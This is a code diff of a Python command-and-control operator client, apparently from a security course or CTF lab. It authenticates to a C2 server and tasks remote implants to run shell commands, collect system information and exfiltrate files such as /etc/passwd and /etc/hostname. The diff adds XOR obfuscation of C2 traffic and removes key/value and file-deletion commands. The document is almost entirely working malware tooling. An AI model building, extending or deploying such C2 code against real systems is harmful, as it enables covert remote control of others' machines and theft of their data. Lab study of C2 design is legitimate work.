@@ -9,9 +9,16 @@ C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
 C2_OPERATOR_PORT = int(os.environ.get("C2_OPERATOR_PORT", "9998"))
 C2_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")
 
+_KEY = b"cs564"
+
+
+def _xor(data):
+    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))
+
 
 def _send(conn, data):
-    conn.sendall(struct.pack(">I", len(data)) + data)
+    enc = _xor(data)
+    conn.sendall(struct.pack(">I", len(enc)) + enc)
 
 
 def _recv(conn):
@@ -28,7 +35,7 @@ def _recv(conn):
         if not c:
             raise ConnectionError("closed")
         buf += c
-    return buf
+    return _xor(buf)
 
 
 def _tx(sock, msg):
@@ -39,31 +46,11 @@ def _tx(sock, msg):
 _HELP = """
 Commands:
   list
-      List all connected implants.
-
   task <ID> RUN_CMD <shell command>
-      Run a shell command on the implant.
-
   task <ID> SYSINFO
-      Collect hostname, OS, user, IP, uptime.
-
   task <ID> EXFIL_FILE <remote path>
-      Read a file from the target and send it to the exfil server.
-      e.g.  task IMP-XXXX EXFIL_FILE /etc/passwd
-
-  task <ID> READ_DATA <key>
-  task <ID> WRITE_DATA <key> <value>
-      Access the implant's in-memory key/value store.
-
-  task <ID> DELETE_FILE <remote path>
-      Delete a file on the target.
-
   task <ID> HEARTBEAT
-      Ping the implant.
-
   task <ID> SHUTDOWN
-      Disconnect the implant.
-
   quit / exit
 """
 
@@ -106,13 +93,6 @@ def _interactive(sock):
                 payload = {"cmd": args}
             elif c2_cmd == "EXFIL_FILE":
                 payload = {"path": args}
-            elif c2_cmd == "READ_DATA":
-                payload = {"key": args}
-            elif c2_cmd == "WRITE_DATA":
-                kv = args.split(None, 1)
-                payload = {"key": kv[0], "value": kv[1] if len(kv) > 1 else ""}
-            elif c2_cmd == "DELETE_FILE":
-                payload = {"path": args}
             elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN"):
                 payload = {}
             else:
@@ -146,8 +126,6 @@ def _print_result(resp):
         if payload.get("stderr"):
             print("  stderr:     {0}".format(payload["stderr"]))
         print("  returncode: {0}".format(payload.get("returncode")))
-    elif "value" in payload:
-        print("  value: {0}".format(payload["value"]))
     elif "message" in payload:
         print("  {0}".format(payload["message"]))
     else:
@@ -155,15 +133,17 @@ def _print_result(resp):
 
 
 def _demo(sock):
+    sep = "=" * 60
+    print("\n{0}".format(sep))
     print("  OPERATOR DEMO")
-    print("  ==============\n")
+    print(sep)
 
     resp = _tx(sock, {"action": "LIST"})
     implants = list(resp.get("implants", {}).keys())
     print("\n[LIST] {0}".format(implants))
 
     if not implants:
-        print("  No implants connected. Start implant_client.py first.")
+        print("  No implants connected.")
         return
 
     t = implants[0]
@@ -174,11 +154,7 @@ def _demo(sock):
         ("SYSINFO", {}),
         ("RUN_CMD", {"cmd": "whoami"}),
         ("RUN_CMD", {"cmd": "hostname"}),
-        ("RUN_CMD", {"cmd": "uname -a"}),
         ("RUN_CMD", {"cmd": "id"}),
-        ("RUN_CMD", {"cmd": "ps aux --no-headers | head -5"}),
-        ("WRITE_DATA", {"key": "flag", "value": "CTF{c2_beacon_success}"}),
-        ("READ_DATA", {"key": "flag"}),
         ("EXFIL_FILE", {"path": "/etc/hostname"}),
     ]
 
@@ -189,31 +165,26 @@ def _demo(sock):
                 {"action": "TASK", "target": t, "command": command, "payload": payload},
             )
             result = resp.get("result", {}).get("payload", {})
-            summary = (
-                result.get("stdout")
-                or result.get("value")
-                or result.get("message")
-                or str(result)
-            )
+            summary = result.get("stdout") or result.get("message") or str(result)
             print("  [{0:<14}]  {1}".format(command, str(summary)[:80]))
         except Exception as exc:
             print("  [{0:<14}]  ERROR: {1}".format(command, exc))
 
-    print("Complete")
+    print("\n{0}".format(sep))
+    print("  DEMO COMPLETE")
+    print("{0}\n".format(sep))
 
 
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else "interactive"
-    print("[OPERATOR] Connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))
+    print("[op] connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.connect((C2_HOST, C2_OPERATOR_PORT))
-
         resp = _tx(sock, {"action": "AUTH", "token": C2_TOKEN})
         if resp.get("status") != "ok":
-            print("[OPERATOR] Auth failed: {0}".format(resp.get("message")))
+            print("[op] auth failed: {0}".format(resp.get("message")))
             return
-        print("[OPERATOR] Authenticated.\n")
-
+        print("[op] authenticated.\n")
         if mode == "demo":
             _demo(sock)
         else:
